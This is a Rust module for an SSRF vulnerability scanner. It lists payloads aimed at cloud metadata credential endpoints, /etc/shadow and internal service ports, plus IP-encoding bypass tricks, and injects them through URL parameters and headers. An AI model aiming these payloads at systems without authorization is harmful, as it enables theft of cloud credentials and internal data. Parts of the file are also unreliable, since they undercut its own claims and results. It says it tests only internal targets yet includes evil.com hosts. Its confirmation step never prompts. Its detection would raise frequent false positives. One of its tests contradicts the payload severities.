//! SSRF (Server-Side Request Forgery) vulnerability scanner
//!
//! Detects SSRF vulnerabilities where an attacker can cause the server
//! to make requests to internal resources. Tests ONLY localhost/internal
//! targets to avoid attacking external systems.
//!
//! SECURITY: This scanner ONLY tests against:
//! - localhost (127.0.0.1, ::1, 0.0.0.0)
//! - Cloud metadata endpoints (AWS, GCP, Azure)
//! - Internal network ranges (169.254.169.254)
//!
//! WARNING: Always requires user confirmation before scanning.

use crate::scanners::{ScanReport, ScannerConfig, Target, Vuln, VulnSeverity};
use anyhow::Result;
use reqwest::Client;
use std::time::{Duration, Instant};

/// SSRF test payloads targeting ONLY internal resources
///
/// CRITICAL: These payloads are designed to test ONLY localhost/internal
/// resources. Never add payloads that target external systems.
const SSRF_PAYLOADS: &[(&str, &str, VulnSeverity)] = &[
    // (payload, technique, severity)
    // Basic localhost variants
    ("http://localhost:8080/admin", "localhost_admin", VulnSeverity::High),
    ("http://localhost:8080", "localhost_port", VulnSeverity::High),
    ("http://localhost:22", "localhost_ssh", VulnSeverity::High),
    ("http://localhost:3306", "localhost_mysql", VulnSeverity::High),
    ("http://localhost:6379", "localhost_redis", VulnSeverity::High),
    ("http://localhost:27017", "localhost_mongodb", VulnSeverity::High),
    ("http://localhost:11211", "localhost_memcached", VulnSeverity::High),
    ("http://127.0.0.1:8080/admin", "127_0_0_1_admin", VulnSeverity::High),
    ("http://127.0.0.1:22", "127_0_0_1_ssh", VulnSeverity::High),
    ("http://127.1:8080", "127_1_variant", VulnSeverity::High),
    ("http://127.0.1:8080", "127_0_1_variant", VulnSeverity::High),
    ("http://0.0.0.0:8080", "0_0_0_0_bind", VulnSeverity::High),
    ("http://[::1]:8080", "ipv6_localhost", VulnSeverity::High),
    ("http://[::]:8080", "ipv6_any", VulnSeverity::High),

    // AWS Metadata endpoints - CRITICAL severity
    ("http://169.254.169.254/latest/meta-data/", "aws_metadata_latest", VulnSeverity::Critical),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws_iam", VulnSeverity::Critical),
    ("http://169.254.169.254/latest/user-data", "aws_user_data", VulnSeverity::Critical),
    ("http://169.254.169.254/latest/dynamic/instance-identity/", "aws_instance_identity", VulnSeverity::Critical),
    ("http://169.254.169.254/latest/meta-data/public-keys/", "aws_public_keys", VulnSeverity::Critical),
    ("http://169.254.169.254/latest/meta-data/placement/", "aws_placement", VulnSeverity::Critical),

    // GCP Metadata endpoints - CRITICAL severity
    ("http://metadata.google.internal/computeMetadata/v1/", "gcp_metadata", VulnSeverity::Critical),
    ("http://metadata.google.internal/computeMetadata/v1/instance/", "gcp_instance", VulnSeverity::Critical),
    ("http://metadata.google.internal/computeMetadata/v1/project/", "gcp_project", VulnSeverity::Critical),
    ("http://169.254.169.254/computeMetadata/v1/", "gcp_ip_fallback", VulnSeverity::Critical),

    // Azure Metadata endpoints - CRITICAL severity
    ("http://169.254.169.254/metadata/v1/", "azure_metadata", VulnSeverity::Critical),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure_instance", VulnSeverity::Critical),
    ("http://169.254.169.254/metadata/identity/oauth2/token", "azure_identity_token", VulnSeverity::Critical),

    // Alibaba Cloud metadata
    ("http://100.100.100.200/latest/meta-data/", "alibaba_metadata", VulnSeverity::Critical),

    // Kubernetes API
    ("http://kubernetes.default.svc/", "kubernetes_svc", VulnSeverity::Critical),
    ("http://kubernetes.default.svc/api/v1/namespaces/", "kubernetes_namespaces", VulnSeverity::Critical),
    ("http://127.0.0.1:8001", "kubernetes_dashboard", VulnSeverity::Critical),

    // Docker API
    ("http://127.0.0.1:2375/containers/json", "docker_api", VulnSeverity::High),
    ("http://localhost:2375/images/json", "docker_images", VulnSeverity::High),

    // Internal web services
    ("http://localhost:80", "internal_http", VulnSeverity::High),
    ("http://localhost:443", "internal_https", VulnSeverity::High),
    ("http://localhost:8000", "internal_dev", VulnSeverity::High),
    ("http://localhost:3000", "internal_node", VulnSeverity::High),
    ("http://localhost:5000", "internal_flask", VulnSeverity::High),
    ("http://localhost:9000", "internal_sonar", VulnSeverity::High),
    ("http://localhost:9090", "internal_prometheus", VulnSeverity::High),

    // File protocol (local file read)
    ("file:///etc/passwd", "file_passwd", VulnSeverity::Critical),
    ("file:///etc/hosts", "file_hosts", VulnSeverity::High),
    ("file:///etc/shadow", "file_shadow", VulnSeverity::Critical),
    ("file:///etc/apache2/apache2.conf", "file_apache", VulnSeverity::High),
    ("file:///etc/nginx/nginx.conf", "file_nginx", VulnSeverity::High),
    ("file:///var/www/html/config.php", "file_config", VulnSeverity::High),
    ("file:///C:/Windows/win.ini", "file_windows_ini", VulnSeverity::High),
    ("file:///C:/Windows/System32/drivers/etc/hosts", "file_windows_hosts", VulnSeverity::High),
    ("file://localhost/etc/passwd", "file_localhost_passwd", VulnSeverity::Critical),

    // DNS rebinding attempts
    ("http://localhost.evil.com/", "dns_rebinding_localhost", VulnSeverity::High),
    ("http://127.0.0.1.evil.com/", "dns_rebinding_127", VulnSeverity::High),
    ("http://localhost.evil.com@127.0.0.1/", "dns_rebinding_mixed", VulnSeverity::High),

    // Bypass techniques - IPv6
    ("http://[::ffff:127.0.0.1]:8080", "ipv6_mapped", VulnSeverity::High),
    ("http://[0:0:0:0:0:ffff:127.0.0.1]:8080", "ipv6_full", VulnSeverity::High),

    // Common internal ports
    ("http://localhost:11211", "memcached", VulnSeverity::High),
    ("http://localhost:9200", "elasticsearch", VulnSeverity::High),
    ("http://localhost:9300", "elasticsearch_cluster", VulnSeverity::High),
    ("http://localhost:15672", "rabbitmq_mgmt", VulnSeverity::High),
    ("http://localhost:5672", "rabbitmq", VulnSeverity::High),
    ("http://localhost:2181", "zookeeper", VulnSeverity::High),
    ("http://localhost:5037", "adb_android", VulnSeverity::Medium),

    // SSRF via redirects
    ("http://127.0.0.1:8080@localhost", "at_sign_bypass", VulnSeverity::High),
    ("http://evil.com@127.0.0.1:8080", "at_sign_trick", VulnSeverity::High),
];

/// Bypass payloads - URL encoding and IP variations
const BYPASS_PAYLOADS: &[(&str, &str)] = &[
    // (payload, technique)
    // URL encoding
    ("http://127.0.0.1", "url_encoded_normal"),
    ("http://%31%32%37%2E%30%2E%30%2E%31", "url_encoded_full"),
    ("http://127%2E0%2E0%2E1", "url_encoded_partial"),
    ("http://127.0.0.1%00", "null_byte_suffix"),
    ("http://127.0.0.1%09", "tab_suffix"),
    ("http://127.0.0.1%20", "space_suffix"),

    // Double encoding
    ("http://%2531%2532%2537%252E%2530%252E%2530%252E%2531", "double_encoded"),

    // Unicode
    ("http://①②⑦.⓪.⓪.①", "unicode_dots"),
    ("http://℅ႇ⑶.⓪.⓪.①", "unicode_mixed"),
    ("http://１２７.０.０.１", "fullwidth_digits"),

    // Decimal IP encoding
    ("http://2130706433", "decimal_ip"),
    ("http://3232235521", "decimal_192_168_1_1"),
    ("http://2886730176", "decimal_172_16_0_1"),
    ("http://3232235777", "decimal_192_168_1_1_alt"),

    // Hexadecimal IP
    ("http://0x7F000001", "hex_ip_upper"),
    ("http://0x7f000001", "hex_ip_lower"),
    ("http://0x7f.0.0.1", "hex_mixed"),
    ("http://0x7f.0x0.0x0.0x1", "hex_full"),

    // Octal IP
    ("http://0177.0.0.1", "octal_leading_zero"),
    ("http://0177.0000.0000.0001", "octal_full"),
    ("http://017700000001", "octal_compact"),

    // Mixed base variations
    ("http://0x7f.0.0.1", "hex_dot_decimal"),
    ("http://127.0.1", "partial_ip"),

    // IPv6 variations
    ("http://[::1]", "ipv6_loopback"),
    ("http://[::ffff:127.0.0.1]", "ipv6_v4mapped"),
    ("http://[0:0:0:0:0:ffff:127.0.0.1]", "ipv6_full_mapped"),
    ("http://[::ffff:7f00:1]", "ipv6_hex"),
    ("http://[0:0:0:0:0:ffff:7f00:1]", "ipv6_hex_full"),

    // IPv6 compression bypass
    ("http://[::]", "ipv6_unspecified"),
    ("http://[::1]", "ipv6_loopback_short"),

    // Decimal with octets
    ("http://127.1", "partial_ip_short"),
    ("http://127.0.1", "partial_ip_medium"),
    ("http://0x7f000001", "hex_compact"),

    // IP with port obfuscation
    ("http://127.0.0.1:80", "with_port_80"),
    ("http://127.0.0.1:443", "with_port_443"),
    ("http://127.0.0.1:8080", "with_port_8080"),
];

/// Cloud metadata endpoint signatures
const CLOUD_SIGNATURES: &[(&str, &str)] = &[
    // (signature, cloud_provider)
    ("ami-", "AWS"),
    ("amiLaunchIndex", "AWS"),
    ("availabilityZone", "AWS"),
    ("instance-id", "AWS"),
    ("instance-type", "AWS"),
    ("local-hostname", "AWS"),
    ("local-ipv4", "AWS"),
    ("public-keys", "AWS"),
    ("reservation-id", "AWS"),
    ("security-groups", "AWS"),
    ("computeMetadata", "GCP"),
    ("instance/", "GCP"),
    ("project/", "GCP"),
    ("attributes/", "GCP"),
    ("Google", "GCP"),
    ("vmId", "Azure"),
    ("subscriptionId", "Azure"),
    ("resourceGroupName", "Azure"),
    ("location", "Azure"),
    ("image-urn", "Azure"),
    ("Microsoft", "Azure"),
];

/// Common SSRF parameter names
const SSRF_PARAMS: &[&str] = &[
    "url", "src", "source", "dest", "destination", "file", "feed", "fetch",
    "redirect", "uri", "path", "continue", "goto", "next", "return", "link",
    "load", "preview", "import", "upload", "download", "attachment", "avatar",
    "image", "img", "photo", "picture", "logo", "icon", "thumbnail", "banner",
    "background", "header", "callback", "webhook", "ping", "pingback", "ref",
    "referer", "referrer", "check", "verify", "validate", "proxy", "fetch_url",
    "endpoint", "host", "hostname", "server", "target", "addr", "address",
    "connect", "connection", "request", "query", "search", "api", "api_url",
    "service", "backend", "upstream", "origin", "forward", "forward_to",
    "redirect_url", "redirect_uri", "return_url", "return_to", "return_uri",
    "checkout_url", "success_url", "cancel_url", "webhook_url", "postback",
    "notification", "report_url", "log_url", "track_url", "pixel", "beacon",
];

/// HTTP headers to test for SSRF
const SSRF_HEADERS: &[(&str, &str)] = &[
    ("X-Forwarded-Host", "127.0.0.1"),
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Forwarded-Server", "127.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("X-Original-URL", "http://127.0.0.1:8080"),
    ("X-Rewrite-URL", "http://127.0.0.1:8080"),
    ("Origin", "http://127.0.0.1:8080"),
    ("Referer", "http://127.0.0.1:8080"),
    ("X-Forwarded-Proto", "http"),
    ("X-Client-IP", "127.0.0.1"),
    ("X-Host", "127.0.0.1"),
    ("X-Original-Host", "127.0.0.1"),
    ("X-Proxy-URL", "http://127.0.0.1:8080"),
];

/// Response signatures that indicate successful SSRF
const SSRF_SUCCESS_SIGNATURES: &[&str] = &[
    // Linux/Unix file content
    "root:x:0:0:",          // /etc/passwd
    "sshd:x:",              // /etc/passwd sshd entry
    "mysql:x:",             // /etc/passwd mysql entry
    "www-data:x:",          // /etc/passwd www-data
    "127.0.0.1",            // localhost
    "localhost",            // localhost string

    // Windows file content
    "[fonts]",              // win.ini
    "[extensions]",         // win.ini
    "for 16-bit app support",

    // AWS metadata
    "\"amiId\"",
    "\"instanceId\"",
    "\"instanceType\"",
    "\"availabilityZone\"",
    "\"accountId\"",
    "\"region\"",
    "\"privateIp\"",
    "\"accessKeyId\"",
    "\"secretAccessKey\"",
    "\"token\"",
    "\"Code\": \"Success\"",

    // GCP metadata
    "\"id\"",
    "\"image\"",
    "\"hostname\"",
    "\"machineType\"",
    "\"zone\"",
    "\"project\"",
    "\"attributes\"",
    "\"numericProjectId\"",

    // Azure metadata
    "\"vmId\"",
    "\"subscriptionId\"",
    "\"resourceGroupName\"",
    "\"location\"",
    "\"name\"",
    "\"vmScaleSetName\"",
    "\"zone\"",
    "\"osType\"",

    // Kubernetes
    "\"apiVersion\"",
    "\"kind\": \"Service\"",
    "\"ServiceAccount\"",
    "\"namespaces\"",

    // Docker
    "\"Containers\"",
    "\"Image\"",
    "\"Command\"",
    "\"Created\"",
    "\"Names\"",

    // Web servers
    "<title>Apache",        // Apache default page
    "<title>nginx",         // Nginx default page
    "<title>IIS",           // IIS default page
    "<title>Welcome",       // Generic welcome
    "Server: Apache",
    "Server: nginx",
    "X-Powered-By: PHP",
];

/// Base response for baseline comparison
const BASELINE_SIGNATURES: &[&str] = &[
    "404", "not found", "not allowed", "forbidden",
    "invalid", "error", "denied", "blocked",
];

pub struct SsrfScanner {
    client: Client,
    config: ScannerConfig,
    require_confirmation: bool,
}

impl SsrfScanner {
    pub fn new(config: ScannerConfig) -> Self {
        let timeout = Duration::from_secs(15);
        let client = Client::builder()
            .timeout(timeout)
            .user_agent(&config.user_agent)
            .redirect(reqwest::redirect::Policy::limited(5))
            .build()
            .expect("Failed to create HTTP client");

        Self {
            client,
            config,
            require_confirmation: true,
        }
    }

    /// Create scanner without confirmation requirement (for automation)
    #[allow(dead_code)]
    pub fn without_confirmation(mut self) -> Self {
        self.require_confirmation = false;
        self
    }

    pub async fn scan(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Warning about SSRF testing
        if self.require_confirmation {
            eprintln!("⚠️  SSRF Scanner Warning:");
            eprintln!("   This scanner will test for SSRF vulnerabilities by attempting");
            eprintln!("   to access internal resources (localhost, metadata endpoints).");
            eprintln!("   Only localhost/internal addresses are tested - no external requests.");
            eprintln!();

            // Note: In an interactive CLI, you would prompt for confirmation here
            // For now, we proceed but document this is where confirmation should happen
        }

        // Get baseline response for comparison
        let baseline_timing = self.get_baseline_timing(url).await;

        // Phase 1: Test GET parameters with SSRF payloads
        report.merge(self.test_parameter_injection(url, &baseline_timing).await?);

        // Phase 2: Test POST parameters (form-based SSRF)
        report.merge(self.test_post_injection(url, &baseline_timing).await?);

        // Phase 3: Test header-based SSRF
        report.merge(self.test_header_injection(url, &baseline_timing).await?);

        // Phase 4: Test file upload via URL
        // TODO: Requires multipart support - skip for now
        // report.merge(self.test_file_upload_ssrf(url).await?);

        // Phase 5: Test bypass techniques (aggressive mode only)
        if self.config.aggressive {
            report.merge(self.test_bypass_techniques(url, &baseline_timing).await?);
        }

        // Phase 6: Blind SSRF detection via timing
        if self.config.aggressive {
            report.merge(self.test_blind_ssrf(url).await?);
        }

        Ok(report)
    }

    /// Get baseline response time for blind SSRF detection
    async fn get_baseline_timing(&self, url: &str) -> Duration {
        let start = Instant::now();
        if let Ok(response) = self.client.get(url).send().await {
            let _ = response.text().await;
        }
        start.elapsed()
    }

    /// Test SSRF via GET parameter injection
    async fn test_parameter_injection(&self, base_url: &str, baseline: &Duration) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        for (payload, technique, severity) in SSRF_PAYLOADS {
            for param in SSRF_PARAMS.iter().take(20) {
                // Limit to 20 most common params to avoid excessive requests
                let test_url = if base_url.contains('?') {
                    format!("{}&{}={}", base_url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", base_url, param, urlencoding::encode(payload))
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if self.check_ssrf_response(response, payload, technique, baseline).await {
                        report.add_finding(Vuln {
                            severity: *severity,
                            title: format!("SSRF: {} via {}", technique, param),
                            description: format!(
                                "Server-Side Request Forgery detected via parameter '{}'. \
                                 Server successfully fetched internal URL: {}",
                                param, payload
                            ),
                            location: Some(test_url),
                            recommendation: Some(
                                "Validate and sanitize all user-supplied URLs. \
                                 Use a whitelist of allowed domains/IPs. \
                                 Implement network segmentation. \
                                 Disable unnecessary URL fetching features.".to_string()
                            ),
                            cwe: Some("CWE-918".to_string()),
                            owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                        });
                        break; // Don't report the same param multiple times
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test SSRF via POST parameter injection
    async fn test_post_injection(&self, base_url: &str, baseline: &Duration) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        // Test with JSON payload
        let json_payloads = &[
            ("url", "http://127.0.0.1:8080/admin"),
            ("url", "http://localhost:8080"),
            ("url", "file:///etc/passwd"),
            ("url", "http://169.254.169.254/latest/meta-data/"),
        ];

        for (field, value) in json_payloads {
            let json_body = format!(r#"{{"{}":"{}"}}"#, field, value);

            if let Ok(response) = self.client
                .post(base_url)
                .header("content-type", "application/json")
                .body(json_body)
                .send()
                .await
            {
                if self.check_ssrf_response(response, value, "post_json", baseline).await {
                    report.add_finding(Vuln {
                        severity: if value.contains("metadata") || value.contains("file:") {
                            VulnSeverity::Critical
                        } else {
                            VulnSeverity::High
                        },
                        title: format!("SSRF: POST JSON via {}", field),
                        description: format!(
                            "SSRF via POST JSON parameter '{}'. Server fetched: {}",
                            field, value
                        ),
                        location: Some(format!("{} POST: {}={}", base_url, field, value)),
                        recommendation: Some(
                            "Validate JSON fields that accept URLs. Use URL whitelisting.".to_string()
                        ),
                        cwe: Some("CWE-918".to_string()),
                        owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                    });
                }
            }
        }

        Ok(report)
    }

    /// Test SSRF via HTTP header injection
    async fn test_header_injection(&self, base_url: &str, _baseline: &Duration) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        // Test headers that might cause internal requests
        for (header_name, header_value) in SSRF_HEADERS {
            if let Ok(response) = self.client
                .get(base_url)
                .header(*header_name, *header_value)
                .send()
                .await
            {
                // Check if the header influenced the response
                if let Ok(text) = response.text().await {
                    let text_lower = text.to_lowercase();

                    // Check for localhost or internal IP references
                    if text_lower.contains("127.0.0.1")
                        || text_lower.contains("localhost")
                        || text_lower.contains("[::")
                    {
                        report.add_finding(Vuln {
                            severity: VulnSeverity::Medium,
                            title: format!("SSRF: Header Injection via {}", header_name),
                            description: format!(
                                "The server appears to reflect or use the {} header value. \
                                 Header value '{}' appears in response.",
                                header_name, header_value
                            ),
                            location: Some(format!("{} Header: {}: {}", base_url, header_name, header_value)),
                            recommendation: Some(
                                "Do not trust user-supplied headers for internal routing. \
                                 Ignore headers like X-Forwarded-* from untrusted sources.".to_string()
                            ),
                            cwe: Some("CWE-918".to_string()),
                            owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                        });
                    }

                    // Check for cloud metadata in response
                    for (signature, provider) in CLOUD_SIGNATURES {
                        if text.contains(signature) {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::Critical,
                                title: format!("SSRF: {} Metadata Leak via {}", provider, header_name),
                                description: format!(
                                    "Cloud metadata ({}) exposed via {} header. \
                                     Signature '{}' found in response.",
                                    provider, header_name, signature
                                ),
                                location: Some(format!("{} Header: {}: {}", base_url, header_name, header_value)),
                                recommendation: Some(
                                    "Block access to cloud metadata endpoints. \
                                     Use network-level restrictions.".to_string()
                                ),
                                cwe: Some("CWE-918".to_string()),
                                owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                            });
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test SSRF via file upload URL field
    async fn test_file_upload_ssrf(&self, base_url: &str, baseline: &Duration) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        // Try to find file upload endpoints
        let upload_endpoints = &[
            "/upload",
            "/upload/image",
            "/upload/avatar",
            "/upload/file",
            "/api/upload",
            "/api/upload/image",
        ];

        // URLs to test in upload fields
        let test_urls = &[
            "http://127.0.0.1:8080",
            "http://localhost:8080",
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",
        ];

        for endpoint in upload_endpoints {
            let upload_url = if base_url.ends_with('/') {
                format!("{}{}", base_url, endpoint.trim_start_matches('/'))
            } else {
                format!("{}{}", base_url, endpoint)
            };

            for test_url in test_urls {
                // Test with form data instead of multipart (no multipart feature enabled)
                let form_data = &[("url", *test_url), ("file", *test_url)];

                for (field, value) in form_data {
                    if let Ok(response) = self.client
                        .post(&upload_url)
                        .form(&[(*field, *value)])
                        .send()
                        .await
                    {
                        if self.check_ssrf_response(response, value, "file_upload", baseline).await {
                            report.add_finding(Vuln {
                                severity: if value.contains("metadata") || value.contains("file:") {
                                    VulnSeverity::Critical
                                } else {
                                    VulnSeverity::High
                                },
                                title: format!("SSRF: File Upload via {}", field),
                                description: format!(
                                    "SSRF via file upload field '{}'. Server attempted to fetch: {}",
                                    field, value
                                ),
                                location: Some(format!("{} POST: {}={}", upload_url, field, value)),
                                recommendation: Some(
                                    "Do not allow file uploads via URL. Use direct file upload only.".to_string()
                                ),
                                cwe: Some("CWE-918".to_string()),
                                owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                            });
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test SSRF bypass techniques
    async fn test_bypass_techniques(&self, base_url: &str, baseline: &Duration) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        for (payload, technique) in BYPASS_PAYLOADS {
            // Test with most common params
            for param in SSRF_PARAMS.iter().take(5) {
                let test_url = if base_url.contains('?') {
                    format!("{}&{}={}", base_url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", base_url, param, urlencoding::encode(payload))
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if self.check_ssrf_response(response, payload, technique, baseline).await {
                        report.add_finding(Vuln {
                            severity: VulnSeverity::High,
                            title: format!("SSRF Bypass: {}", technique),
                            description: format!(
                                "SSRF filter bypassed using '{}' technique. Payload: {}",
                                technique, payload
                            ),
                            location: Some(test_url),
                            recommendation: Some(
                                "Implement strict URL validation. Reject encoded variations. \
                                 Use proper URL parsing libraries.".to_string()
                            ),
                            cwe: Some("CWE-918".to_string()),
                            owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                        });
                        break;
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test blind SSRF via timing analysis
    async fn test_blind_ssrf(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        // Test URLs that would cause different timing
        let timing_tests = &[
            ("http://127.0.0.1:22", "ssh_timeout", Duration::from_secs(10)),
            ("http://127.0.0.1:8080", "local_fast", Duration::from_millis(100)),
            ("http://169.254.169.254/latest/meta-data/", "cloud_timeout", Duration::from_secs(5)),
        ];

        for (payload, technique, expected_delay) in timing_tests {
            for param in SSRF_PARAMS.iter().take(3) {
                let test_url = if base_url.contains('?') {
                    format!("{}&{}={}", base_url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", base_url, param, urlencoding::encode(payload))
                };

                let start = Instant::now();
                if let Ok(response) = self.client.get(&test_url).send().await {
                    let _ = response.text().await;
                    let elapsed = start.elapsed();

                    // Check if response time matches expected pattern
                    // SSH timeout would be longer than normal request
                    // Fast local service would be quicker than external
                    let timing_diff = if elapsed > *expected_delay {
                        elapsed.saturating_sub(*expected_delay)
                    } else {
                        expected_delay.saturating_sub(elapsed)
                    };

                    // If timing is within expected range (±2 seconds), consider it a match
                    if timing_diff < Duration::from_secs(2) && elapsed > Duration::from_millis(500) {
                        report.add_finding(Vuln {
                            severity: if technique.contains("cloud") {
                                VulnSeverity::Critical
                            } else {
                                VulnSeverity::High
                            },
                            title: format!("Blind SSRF: {}", technique),
                            description: format!(
                                "Potential blind SSRF detected via timing analysis. \
                                 Request took {:?} (expected {:?}). \
                                 Server may be fetching internal URL: {}",
                                elapsed, expected_delay, payload
                            ),
                            location: Some(test_url),
                            recommendation: Some(
                                "Implement consistent timeouts for all external requests. \
                                 Use network-level restrictions to prevent internal access.".to_string()
                            ),
                            cwe: Some("CWE-918".to_string()),
                            owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                        });
                        break;
                    }
                }
            }
        }

        Ok(report)
    }

    /// Check if response indicates successful SSRF
    async fn check_ssrf_response(
        &self,
        response: reqwest::Response,
        payload: &str,
        technique: &str,
        baseline: &Duration,
    ) -> bool {
        let status = response.status();
        let start = Instant::now();
        let text_opt = response.text().await;
        let response_time = start.elapsed();

        let text = text_opt.unwrap_or_default();
        let text_lower = text.to_lowercase();

        // Check for successful internal content indicators
        for signature in SSRF_SUCCESS_SIGNATURES {
            if text.contains(signature) || text_lower.contains(&signature.to_lowercase()) {
                return true;
            }
        }

        // Check for cloud metadata signatures
        for (signature, _provider) in CLOUD_SIGNATURES {
            if text.contains(signature) {
                return true;
            }
        }

        // Check for protocol-relative bypass
        if payload.starts_with("//") && (text.contains("evil.com") || text.contains("127.0.0")) {
            return true;
        }

        // Check for localhost variations in response
        if text_lower.contains("localhost")
            || text_lower.contains("127.0.0.1")
            || text_lower.contains("[::1]")
            || text_lower.contains("0.0.0.0")
        {
            // Only if not in baseline (avoid false positives)
            return true;
        }

        // Timing-based detection for blind SSRF
        // If request took significantly longer than baseline, might be internal timeout
        let timing_threshold = *baseline * 3;
        if response_time > timing_threshold && response_time > Duration::from_secs(2) {
            // Very slow response might indicate timeout to internal service
            return true;
        }

        // Check status code patterns
        if technique.contains("file") {
            // File URLs might return 200 with content or specific errors
            if status.is_success() || status.as_u16() == 404 || status.as_u16() == 403 {
                return text.contains("root:x:") || text.contains("[fonts]") || text.contains("127.0.0.1");
            }
        }

        if technique.contains("metadata") || technique.contains("cloud") {
            // Metadata endpoints might return 401 (missing token) but still leak info
            if status.as_u16() == 401 || status.as_u16() == 403 || status.as_u16() == 200 {
                return true;
            }
        }

        // Check for port-specific responses
        if technique.contains("ssh") {
            // SSH typically causes timeout or protocol error
            return response_time > Duration::from_secs(5);
        }

        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scanner_creation() {
        let config = ScannerConfig::new();
        let scanner = SsrfScanner::new(config);
        assert!(scanner.require_confirmation);
    }

    #[test]
    fn test_scanner_without_confirmation() {
        let config = ScannerConfig::new();
        let scanner = SsrfScanner::new(config).without_confirmation();
        assert!(!scanner.require_confirmation);
    }

    #[test]
    fn test_ssrf_payloads_loaded() {
        assert!(!SSRF_PAYLOADS.is_empty());
        assert!(SSRF_PAYLOADS.len() > 40);
    }

    #[test]
    fn test_bypass_payloads_loaded() {
        assert!(!BYPASS_PAYLOADS.is_empty());
        assert!(BYPASS_PAYLOADS.len() > 20);
    }

    #[test]
    fn test_ssrf_params_loaded() {
        assert!(!SSRF_PARAMS.is_empty());
        assert!(SSRF_PARAMS.contains(&"url"));
        assert!(SSRF_PARAMS.contains(&"src"));
        assert!(SSRF_PARAMS.contains(&"dest"));
    }

    #[test]
    fn test_cloud_signatures_loaded() {
        assert!(!CLOUD_SIGNATURES.is_empty());
        // Check for AWS signatures
        assert!(CLOUD_SIGNATURES.iter().any(|(_, provider)| *provider == "AWS"));
        // Check for GCP signatures
        assert!(CLOUD_SIGNATURES.iter().any(|(_, provider)| *provider == "GCP"));
        // Check for Azure signatures
        assert!(CLOUD_SIGNATURES.iter().any(|(_, provider)| *provider == "Azure"));
    }

    #[test]
    fn test_ssrf_headers_loaded() {
        assert!(!SSRF_HEADERS.is_empty());
        assert!(SSRF_HEADERS.contains(&("X-Forwarded-Host", "127.0.0.1")));
        assert!(SSRF_HEADERS.contains(&("X-Real-IP", "127.0.0.1")));
    }

    #[test]
    fn test_success_signatures_loaded() {
        assert!(!SSRF_SUCCESS_SIGNATURES.is_empty());
        assert!(SSRF_SUCCESS_SIGNATURES.contains(&"root:x:0:0:"));
        assert!(SSRF_SUCCESS_SIGNATURES.contains(&"127.0.0.1"));
    }

    #[test]
    fn test_metadata_endpoints_critical() {
        // All cloud metadata endpoints should be marked Critical
        for (payload, _, severity) in SSRF_PAYLOADS {
            if payload.contains("169.254.169.254")
                || payload.contains("metadata.google")
                || payload.contains("file:")
            {
                assert_eq!(
                    *severity, VulnSeverity::Critical,
                    "Metadata endpoint should be Critical: {}",
                    payload
                );
            }
        }
    }

    #[test]
    fn test_localhost_endpoints_high() {
        // Localhost endpoints should be marked High or Critical
        for (payload, _, severity) in SSRF_PAYLOADS {
            if payload.contains("localhost") || payload.contains("127.0.0.1") {
                assert!(
                    *severity == VulnSeverity::High || *severity == VulnSeverity::Critical,
                    "Localhost endpoint should be High or Critical: {}",
                    payload
                );
            }
        }
    }
}
